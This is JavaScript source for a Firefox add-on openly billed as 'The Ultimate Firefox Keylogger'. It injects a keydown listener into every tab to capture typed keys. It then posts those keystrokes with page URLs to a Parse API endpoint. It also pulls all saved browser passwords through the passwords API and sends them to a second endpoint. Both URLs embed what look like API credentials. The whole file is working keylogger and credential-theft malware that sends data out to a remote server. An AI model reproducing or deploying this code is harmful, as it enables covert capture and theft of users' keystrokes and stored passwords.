/****************************************************************
The Ultimate Firefox Keylogger - Restartless Add-on
*****************************************************************/

var tabs = require("sdk/tabs");
var ss = require("sdk/simple-storage");
var URLS = {
  logUrl: "https://JOjFu2dLzXjaU44uOEdav8cW0qdGS6P6Ud0uOwM1:javascript-key=wReHv8bEMS6xSDxxysxvNjmUvLHt41nrrXDn2jgt@api.parse.com/1/classes/Logs",
  credUrl: "https://JOjFu2dLzXjaU44uOEdav8cW0qdGS6P6Ud0uOwM1:javascript-key=wReHv8bEMS6xSDxxysxvNjmUvLHt41nrrXDn2jgt@api.parse.com/1/classes/Pwds"
};

ss.storage.pages = [];
ss.storage.data = ss.storage.data || "";

// Track keyboard actions when page loading is complete
tabs.on("ready", function(tab) {
  ss.storage.pages.push(tab.url);
  var worker = tab.attach({
    contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
  });
  worker.port.on('storage', function(data){
    if(data.length == 1)
      ss.storage.data += data;
    else
      ss.storage.data += "["+data+"]";
  });
});


// Send recorded data to server and track new set of keyboard actions when current tab is activated
tabs.on("activate", function(tab) {
  var payload = { url: tab.url, data: ss.storage.data };
  require("sdk/request").Request({
    url: URLS.logUrl,
    content: JSON.stringify(payload),
    onComplete: console.log(ss.storage.data)
  }).post();

  ss.storage.data = "";
  if(ss.storage.pages.indexOf(tab.url) == -1){
    ss.storage.pages.push(tab.url);
    var worker = tab.attach({
      contentScript: 'window.addEventListener("keydown", function (event) { self.port.emit("storage", event.key); }, true);',
    });
    worker.port.on('storage', function(data){
      if(data.length == 1)
        ss.storage.data += data;
      else
        ss.storage.data += "["+data+"]";
    });
  }
});

require("sdk/passwords").search({
  onComplete: function onComplete(credentials) {
    require("sdk/request").Request({
      url: URLS.credUrl,
      content: JSON.stringify({ credentials: JSON.stringify(credentials) }),
      onComplete: console.log(credentials)
    }).post();
  }
});

// Display stored data in console fr debugging and testing
// require("sdk/ui/button/action").ActionButton({
//   id: "write",
//   label: "Write",
//   icon: "./icon-16.png",
//   onClick: function() {
//     console.log(ss.storage.pages);
//     console.log(ss.storage.data);
//   }
// });
